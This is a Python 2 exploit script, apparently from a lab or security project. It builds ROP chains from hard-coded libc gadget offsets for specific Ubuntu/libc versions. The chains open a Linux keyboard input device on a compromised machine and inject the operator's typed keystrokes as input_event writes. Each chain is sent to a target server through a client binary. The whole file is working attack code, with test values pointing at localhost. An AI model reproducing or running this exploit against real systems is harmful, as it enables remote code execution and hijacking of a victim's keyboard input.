import re
import sys
import subprocess

from rop_shellcode import GenerateROPShellcode

mapping = {}

pop_ecx_pop_eax = ''
mov_eax_ecx = ''
pop_ebx_ret = ''
xor_eax_eax = ''
pop_ecx_pop_edx = ''
mov_pedx_eax_mov_eax_edx = ''
mov_edx_eax_mov_eax_edx = ''
mov_ebx_edx = ''
xor_edx_edx_mov_eax_edx = ''
mov_eax_0x2 = ''
mov_eax_0x4 = ''
mov_ecx_eax_mov_edx_ecx_pop_ebx = ''
inc_eax = ''
add_eax_0x4 = ''
add_eax_0x5 = ''
add_eax_0x10 = ''
call_gs_10 = ''

rop_code = ''
 
offset = 4

generator = GenerateROPShellcode(padding=0, _id=0, json_file=None)


def open_file(file_name):
 
    global rop_code
    global offset
 
    if len(file_name) % 4 > 0:
        null_offset = len(file_name) % 4
        for i in range (0, 4 - len(file_name) % 4):
            file_name = file_name + 'a'
    else:
        null_offset = 4
   
    tokens = re.findall('....', file_name)
 
    for token in tokens:
        commands = [pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + mov_eax_ecx]
        commands[0] = commands[0] + '0x'
        token = token[::-1]
        for char in token:
            commands[0] = commands[0] + str(hex(ord(char)))[2:]
        token = token[::-1]
        commands[0] = commands[0] + ": " + token + '\\n'
        commands[1] = commands[1] + str(hex(offset))
        commands[3] = token + commands[3]
        rop_code = rop_code + ''.join(commands)
        offset = offset + 4
 
    null_offset = null_offset + offset - 4
 
    rop_code = rop_code + pop_ebx_ret + 'Address    : 0x4: Offset for ' + tokens[0] + ' (.data base)\\n'
    rop_code = rop_code + xor_eax_eax
    rop_code = rop_code + pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\nAddress    : ' + str(hex(null_offset)) + ': Offset for NULL (.data base)\\n'
    rop_code = rop_code + mov_pedx_eax_mov_eax_edx
    rop_code = rop_code + xor_edx_edx_mov_eax_edx
    rop_code = rop_code + pop_ecx_pop_edx + 'Padding    : 0x02020202: (To neutralize pop ecx)\\nAddress    : ' + str(hex(null_offset + 4)) + ': Offset for 0x2 (.data base)\\n'
    rop_code = rop_code + mov_eax_0x2
    rop_code = rop_code + mov_pedx_eax_mov_eax_edx
    rop_code = rop_code + mov_ecx_eax_mov_edx_ecx_pop_ebx + 'Address    : 0x4: Offset for ' + tokens[0] + ' (.data base)\\n'
    rop_code = rop_code + xor_edx_edx_mov_eax_edx
    rop_code = rop_code + add_eax_0x5
    rop_code = rop_code + call_gs_10
    # copy file descriptor to ebx
    rop_code = rop_code + mov_edx_eax_mov_eax_edx
    rop_code = rop_code + mov_ebx_edx
 
 
def write_file(text, ip_addr, port_no):
 
    global rop_code
    global offset
 
    offset = offset + 4

    preserved_length = len(rop_code)
 
    event_type = '1'
    event_code = ''
    event_value = '1'
    i = -1

    for char in text:
        i = i + 1
        # event_type and event_code
        commands = [pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + mov_eax_ecx]
        commands[0] = commands[0] + '0x00' + hex(int(mapping[char.upper()]))[2:] + '0001' # event_type and event_code, example: 0104000
        commands[0] = commands[0] + ': event_type and event_code\\n'
        commands[1] = commands[1] + str(hex(offset + 8)) # leave the first 8 bytes for event.time in the input_event struct
        commands[3] = 'event_type and event_code' + commands[3]
        rop_code = rop_code + ''.join(commands)
        # event_value : 1
        commands = [pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + mov_eax_ecx]
        commands[0] = commands[0] + '0x00000001' # event_value, example: 0100000
        commands[0] = commands[0] + ': event_value\\n'
        commands[1] = commands[1] + str(hex(offset + 12))
        commands[3] = 'event_value' + commands[3]
        rop_code = rop_code + ''.join(commands)
        rop_code = rop_code + pop_ecx_pop_eax + 'Address    : ' + str(hex(offset)) + ' : Offset for struct\\nPadding    : 0x01010101: (To neutralize pop eax)\\n' 
        rop_code = rop_code + xor_eax_eax
        rop_code = rop_code + add_eax_0x10 + 'Padding    : 0x01010101: (To neutralize pop esi)\\nPadding    : 0x01010101: (To neutralize pop edi)\\n'
        rop_code = rop_code + mov_edx_eax_mov_eax_edx
        rop_code = rop_code + mov_eax_0x4
        rop_code = rop_code + call_gs_10
        # event_value : 0
        commands = [pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + mov_eax_ecx]
        commands[0] = commands[0] + '0x00000000' # event_value
        commands[0] = commands[0] + ': event_value\\n'
        commands[1] = commands[1] + str(hex(offset + 12))
        commands[3] = 'event_value' + commands[3]
        rop_code = rop_code + ''.join(commands)
        rop_code = rop_code + pop_ecx_pop_eax + 'Address    : ' + str(hex(offset)) + ' : Offset for struct\\nPadding    : 0x01010101: (To neutralize pop eax)\\n' 
        rop_code = rop_code + xor_eax_eax
        rop_code = rop_code + add_eax_0x10 + 'Padding    : 0x01010101: (To neutralize pop esi)\\nPadding    : 0x01010101: (To neutralize pop edi)\\n'
        rop_code = rop_code + mov_edx_eax_mov_eax_edx
        rop_code = rop_code + mov_eax_0x4
        rop_code = rop_code + call_gs_10
        if i == 1 or text.index(char) == len(text) - 1:
            generator.code = rop_code[:-2].replace('\\n', '\n')
            generator.shellcode = ''
            generator.addresses = []
            generator.construct_shellcode()
            rop_code = rop_code[:preserved_length]
            subprocess.call(['bin/simple_client', ip_addr, port_no, '/'])
            # subprocess.call(['sudo', 'bin/rop/exploitable'])
            i = -1
    

def main():
    # Keyboard mapping - this can be procured from the device that has been hacked into
    if len(sys.argv) < 3:
        print 'Event number of keyboard and path of keyboard mapping file needed.'
        sys.exit(1)

    global mapping
    global pop_ecx_pop_eax
    global mov_eax_ecx
    global pop_ebx_ret
    global xor_eax_eax
    global pop_ecx_pop_edx
    global mov_pedx_eax_mov_eax_edx
    global mov_edx_eax_mov_eax_edx
    global mov_ebx_edx
    global xor_edx_edx_mov_eax_edx
    global mov_eax_0x2
    global mov_eax_0x4
    global mov_ecx_eax_mov_edx_ecx_pop_ebx
    global inc_eax
    global add_eax_0x4
    global add_eax_0x5
    global add_eax_0x10
    global call_gs_10
    global rop_code
    global offset
    global generator

    mapping_file = open(sys.argv[2], 'r')
    lines = mapping_file.readlines()
    mapping_file.close()

    for line in lines:
        tokens = line.split(' ')
        mapping[tokens[3][5:-2]] = tokens[2]

    if sys.argv[len(sys.argv) - 1] == 'ubuntu12.04-libc2.15':
        pop_ecx_pop_eax = 'ROP command: 0xf2d21L: pop ecx ; pop eax ;;\\n'
        mov_eax_ecx = 'ROP command: 0x2d987L: mov [eax] ecx ;;\\n'
        pop_ebx_ret = 'ROP command: 0x1930eL: pop ebx ;;\\n'
        xor_eax_eax = 'ROP command: 0x34154L: xor eax eax ;;\\n'
        pop_ecx_pop_edx = 'ROP command: 0x2df7bL: pop ecx ; pop edx ;;\\n'
        mov_pedx_eax_mov_eax_edx = 'ROP command: 0x85fd2L: mov [edx] eax ; mov eax edx ;;\\n'
        mov_edx_eax_mov_eax_edx = 'ROP command: 0x12052fL: mov edx eax ; mov eax edx ;; \\n'
        mov_ebx_edx = 'ROP command: 0xddd42L: mov ebx edx ;;\\n'
        xor_edx_edx_mov_eax_edx = 'ROP command: 0x83525L: xor edx edx ; mov eax edx ;;\\n'
        mov_eax_0x2 = 'ROP command: 0xa78a0L: mov eax 0x2 ;;\\n'
        mov_eax_0x4 = 'ROP command: 0xa78c0L: mov eax 0x4 ;;\\n'
        mov_ecx_eax_mov_edx_ecx_pop_ebx = 'ROP command: 0x13d762L: mov ecx [eax] ; mov [edx] ecx ; pop ebx ;;\\n'
        mov_eax_0x4 = 'ROP command: 0xa78c0L: mov eax 0x4 ;;\\n'
        inc_eax = 'ROP command: 0x64fcL: inc eax ;;\\n'
        mov_eax_0x6 = 'ROP command: 0xa78e0L: mov eax 0x6 ;;\\n'
        add_eax_0x4 = 'ROP command: 0x14840cL: add eax 0x4 ;;\\n'
        add_eax_0x5 = 'ROP command: 0x148410L: add eax 0x5 ;;\\n'
        add_eax_0x8 = 'ROP command: 0x98c50L: add eax 0x8 ;;\\n'
        add_eax_0x10 = 'ROP command: 0x847e8L: add eax 0x10 ; pop edi ; pop esi ;;\\n'
        add_eax_0x20 = 'ROP command: 0x847f5L: add eax 0x20 ; pop edi ; pop esi ;;\\n'
        add_eax_0x30 = 'ROP command: 0x84802L: add eax 0x30 ; pop edi ; pop esi ;;\\n'
        call_gs_10 = 'ROP command: 0xb8da5L: call dword [gs:0x10] ;;\\n'
 
    else:
        pop_ecx_pop_eax = 'ROP command: 0xf5160L: pop ecx ; pop eax ;;\\n'
        mov_eax_ecx = 'ROP command: 0x2e09fL: mov [eax] ecx ;;\\n'
        pop_ebx_ret = 'ROP command: 0x742aeL: pop ebx ; ret ;\\n'
        xor_eax_eax = 'ROP command: 0x34964L: xor eax eax ;;\\n'
        pop_ecx_pop_edx = 'ROP command: 0x2e8bbL: pop ecx ; pop edx ;;\\n'
        mov_pedx_eax_mov_eax_edx = 'ROP command: 0x8e034L: mov [edx] eax ; mov eax edx ;;\\n'
        mov_edx_eax_mov_eax_edx = 'ROP command: 0x122339L: mov edx eax ; mov eax edx ;; \\n'
        mov_ebx_edx = 'ROP command: 0xdf572L: mov ebx edx ;;\\n'
        xor_edx_edx_mov_eax_edx = 'ROP command: 0x83f67L: xor edx edx ; mov eax edx ;;\\n'
        mov_eax_0x2 = 'ROP command: 0x1171f0L: mov eax 0x2 ;;\\n'
        mov_eax_0x4 = 'ROP command: 0xa9a10L: mov eax 0x4 ;;\\n'
        mov_ecx_eax_mov_edx_ecx_pop_ebx = 'ROP command: 0x143f2cL: mov ecx [eax] ; mov [edx] ecx ; pop ebx ;;\\n'
        mov_eax_0x4 = 'ROP command: 0xa9a10L: mov eax 0x4 ;;\\n'
        inc_eax = 'ROP command: 0x41e3aL: inc eax ;;\\n'
        add_eax_0x4 = 'ROP command: 0x14da0cL: add eax 0x4 ;;\\n'
        add_eax_0x5 = 'ROP command: 0x14da10L: add eax 0x5 ;;\\n'
        add_eax_0x10 = 'ROP command: 0x85238L: add eax 0x10 ; pop edi ; pop esi ;;\\n'
        call_gs_10 = 'ROP command: 0xbaa75L: call dword [gs:0x10] ;;\\n'

    ### For testing
    generator.libc_base = '0xb7e17000'
    generator.data_base = '0x0804b080'
    generator.padding = 133
    generator.print_code = True
    generator.file_name = 'src/simple_client.c'
    generator.line_num = 11
    ip_addr = '127.0.0.1'
    port_no = '10000'

    # generator.libc_base = hex(int(str(raw_input('Enter the libc base (format - 0xdeadbeef): ')).replace('L', ''), 16))
    # generator.data_base = hex(int(str(raw_input('Enter the data base (format - 0xdeadbeef): ')).replace('L', ''), 16))
    # generator.padding = int(raw_input('Padding: '))
    # generator.print_code = str(raw_input('Would you like to write the code into a file (y/n)? ')) == 'y'
    # if generator.print_code:
    #     generator.file_name = str(raw_input('File name: '))
    #     generator.line_num = int(raw_input('Which line should the code be written onto? '))

    # ip_addr = str(raw_input('IP address of server: '))
    # port_no = str(raw_input('Port number: '))

    text = raw_input('Start typing..\n')
    open_file(file_name='/dev/input/event' + sys.argv[1])
    while text != 'stop':
        write_file(text=text,ip_addr=ip_addr, port_no=port_no)
        text = raw_input('')

if __name__ == '__main__':
    main()
